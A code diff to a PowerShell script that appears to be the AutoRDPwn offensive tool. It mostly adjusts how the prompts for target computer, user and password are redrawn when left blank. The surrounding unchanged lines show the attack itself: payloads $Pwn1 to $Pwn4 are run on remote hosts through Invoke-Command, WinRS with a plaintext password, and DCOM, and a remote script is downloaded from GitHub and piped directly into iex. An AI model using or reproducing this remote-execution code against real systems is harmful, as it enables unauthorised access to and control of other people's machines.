@@ -249,10 +249,12 @@ if($Language -in 'Spanish') {
         del .\psexec.exe }
 
         '2' {
-	Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
-        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
-        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
+        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
+	$computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+	$user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
+	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray
         $domain = $Host.UI.ReadLine() ; if(!$domain) { $domain = 'localhost' ; Write-Host "localhost" }
         do { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray
@@ -294,13 +296,16 @@ if($Language -in 'Spanish') {
 	if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[+] Command execution failed!" -ForegroundColor Red }}}
 
         '4' {
-        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
-        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
-        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
-        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
+        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
+	$computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+	$user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
+	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
+        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-        if(!$credential) { Write-Host "********" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
+	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         if(!$user) { Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn1 }
         Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn2 }
         Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn3 }
@@ -311,14 +316,16 @@ if($Language -in 'Spanish') {
         Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn4 }}}
 
         '5' {
-        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
-        do { Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
-        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $user )
-        do { Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
+        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
+	$computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
+        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+	$user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
+	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
+        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$PlainTextPassword) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $PlainTextPassword )
-	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop")  
+	Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
@@ -333,8 +340,9 @@ if($Language -in 'Spanish') {
         else{ Write-Host "$txt5" -ForegroundColor Red ; sleep -milliseconds 4000 ; $input = $null ; Show-Banner ; Show-Menu }}
 
 	'7' {
-	Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-	$computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
+        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
+	$computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-DCOM.ps1" -UseBasicParsing | iex
 	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn1"
